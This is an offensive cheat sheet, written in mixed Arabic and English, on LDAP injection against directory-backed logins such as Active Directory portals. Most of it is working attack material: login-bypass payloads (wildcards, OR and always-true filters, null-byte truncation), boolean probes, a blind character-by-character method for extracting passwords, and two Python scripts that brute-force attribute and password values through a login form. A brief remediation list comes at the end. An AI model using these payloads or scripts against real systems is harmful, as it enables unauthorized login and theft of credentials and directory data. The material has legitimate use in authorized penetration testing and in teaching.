


# 🎯 LDAP Injection –  Cheat Sheet

---

# 1️⃣ 📌 متى أشك إن الهدف بيستخدم LDAP؟

## 🎯 Indicators قوية جدًا:

- Login مربوط بـ Active Directory
    
- Portal موظفين
    
- Outlook / VPN / SSO
    
- Windows-based enterprise app
    
- وجود NTLM / Kerberos في الريسبونس
    
- Errors فيها:
    
    - `LDAP`
        
    - `Invalid DN`
        
    - `80090308`
        
    - `Filter error`
        

---

# 2️⃣ 🧠 فهم شكل الفلتر الأساسي

أغلب تطبيقات الـ login بتبني query بالشكل ده:

```
(&(uid=USER)(password=PASS))
```

أو:

```
(&(objectClass=user)(sAMAccountName=USER))
```

---

# 3️⃣ 🧪 Detection Phase

## 🔎 Step 1: Basic Special Characters

جرب:

```
*
)(
*)(
```

لو حصل:

- Error مختلف
    
- Response length اختلف
    
- Redirect behavior اتغير
    

👉 احتمال LDAP Injection

---

## Login Bypass

LDAP supports several formats to store the password: clear, md5, smd5, sh1, sha, crypt. So, it could be that independently of what you insert inside the password, it is hashed.

```
user=* password=* 
--> (&(user=*)(password=*)) # The asterisks are great in LDAPi
```

```
user=*)(& password=*)(&
 --> (&(user=*)(&)(password=*)(&))
```

```
user=*)(|(& pass=pwd)
 --> (&(user=*)(|(&)(pass=pwd))
```

```
user=*)(|(password=* password=test) 
--> (&(user=*)(|(password=*)(password=test))
```

```
user=*))%00 pass=any 
--> (&(user=*))%00 --> Nothing more is executed
```

```
user=admin)(&) password=pwd 
--> (&(user=admin)(&))(password=pwd) #Can through an error
```

```
username = admin)(!(&(| pass = any))
 --> (&(uid= admin)(!(& (|) (webpassword=any)))) 
—> As (|) is FALSE then the user is admin and the password check is True.
```

```
username=* password=*)(& 
--> (&(user=*)(password=*)(&))
```

```
username=admin))(|(|
password=any
--> (&(uid=admin)) (| (|) (webpassword=any))

```
#### Lists

- [LDAP_FUZZ](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt)
- [LDAP Attributes](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_attributes.txt)
- [LDAP PosixAccount attributes](https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html)

---

## 🔎 Step 2: Boolean Testing

### True condition payload:

```
*)(objectClass=*))(&objectClass=void
```

### False condition payload:

```
void)(objectClass=void))(&objectClass=void
```

لو الرد اختلف → Vulnerable

---

# 4️⃣ 🔥 Login Bypass Payloads

## ⭐ Wildcard Bypass

```
user=*
pass=*
```

ينتج:

```
(&(user=*)(password=*))
```

---

## ⭐ OR Logic Bypass

```
user=*)(|
pass=anything
```

---

## ⭐ Always True Trick

```
username=admin)(!(&(| 
password=any))
```

السبب:

- (|) = False
    
- !False = True
    

---

## ⭐ Null Byte Truncation

```
user=*))%00
pass=anything
```

---

# 5️⃣ 🧬 Blind LDAP Injection

لو مفيش error أو data واضحة  
نستخدم Boolean extraction

## مثال استخراج password:

```
(&(sn=administrator)(password=A*))
```

لو True → يبدأ بـ A

نكمل:

```
(&(sn=administrator)(password=MA*))
```

وهكذا لحد ما نطلع القيمة كاملة.

---

# 6️⃣ 🛠 Attribute Discovery

## أشهر LDAP Attributes

```
cn
sn
uid
mail
userPassword
objectClass
memberOf
sAMAccountName
givenName
displayName
```

---

# 7️⃣ 🧪 Automation Script (Bug Bounty Style)

## 🐍 Blind Extraction Script

```python
#!/usr/bin/python3

import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    print("[i] Looking for number " + str(i))
    for char in alphabet:
        r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char)
        if ("TRUE CONDITION" in r.text):
            flag += char
            print("[+] Flag: " + flag)
            break

```

---

# 8️⃣ 🧠 Discover valid LDAP fields Script

LDAP objects **contains by default several attributes** that could be used to **save information**. You can try to **brute-force all of them to extract that info.** You can find a list of [**default LDAP attributes here**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_attributes.txt).

```python
#!/usr/bin/python3
import requests
import string
from time import sleep
import sys

proxy = { "http": "localhost:8080" }
url = "http://10.10.10.10/login.php"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

for attribute in attributes: #Extract all attributes
    value = ""
    finish = False
    while not finish:
        for char in alphabet: #In each possition test each possible printable char
            query = f"*)({attribute}={value}{char}*"
            data = {'login':query, 'password':'bla'}
            r = requests.post(url, data=data, proxies=proxy)
            sys.stdout.write(f"\r{attribute}: {value}{char}")
            #sleep(0.5) #Avoid brute-force bans
            if "Cannot login" in r.text:
                value += str(char)
                break

            if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
                finish = True
                print()
```

---

# 9️⃣ 🧨 Advanced Payloads

```
*)(uid=*
*)(mail=*
*)(objectClass=*
*)(memberOf=*
admin)(&)
admin))(|(| 
```

---

# 🔟 🎯 Data Dump Strategy

1. اكتشف valid attribute
    
2. استخدم wildcard
    
3. استخرج حرف حرف
    
4. كرر العملية
    

---

# 🧪 Fuzzing باستخدام Burp Intruder

- استخدم Sniper mode
    
- اعمل Position عند username
    
- جرب:
    

```
*)(|
*)(&
*
)(
```

راقب:

- Status code
    
- Content length
    
- Redirect
    
- Error message
    

---

# 🛡 Remediation (عشان التقرير)

- Escape special chars:
    
    - `*`
        
    - `(`
        
    - `)`
        
    - `|`
        
    - `&`
        
- Parameterized LDAP queries
    
- Least privilege
    
- Input validation
    

---
